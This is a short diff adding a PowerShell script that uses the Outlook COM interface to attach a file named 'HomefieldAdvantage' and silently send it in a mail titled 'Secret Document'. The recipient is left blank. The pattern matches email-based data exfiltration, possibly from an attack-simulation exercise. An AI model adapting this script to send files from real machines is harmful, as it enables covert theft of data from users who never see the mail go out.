@@ -1,0 +1,10 @@
+$to = ""
+$subject = "Secret Document"
+$content = "Important message attached."
+$outlook = new-object -com Outlook.Application
+$mail = $outlook.CreateItem(0)
+$mail.Attachments.Add("HomefieldAdvantage")
+$mail.subject = $subject
+$mail.To = $to
+$mail.HTMLBody = $content
+$mail.Send()
